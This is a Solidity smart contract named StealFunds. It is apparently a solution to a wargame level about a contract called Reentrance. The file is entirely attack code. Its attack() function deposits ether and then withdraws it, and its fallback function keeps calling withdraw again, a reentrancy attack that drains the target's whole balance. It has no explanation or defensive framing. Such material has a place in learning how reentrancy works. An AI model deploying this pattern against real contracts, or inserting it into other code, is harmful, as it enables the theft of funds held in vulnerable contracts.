pragma solidity ^0.8.0;

contract StealFunds {
    Reentrance public target;

    constructor(address payable reentranceContractAddress) {
        target = Reentrance(reentranceContractAddress);
    }

    fallback() external payable {
        uint256 targetBalance = address(target).balance;
        if (address(target).balance > 0) {
            target.withdraw(targetBalance);
        }
    }

    function attack() external payable {
        uint256 targetBalance = address(target).balance;
        require(msg.value >= targetBalance);
        target.donate{value: targetBalance, gas: 40000000}(address(this));
        target.withdraw(targetBalance);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

interface Reentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external returns (uint256 balance);

    function withdraw(uint256 amount) external;

    receive() external payable;
}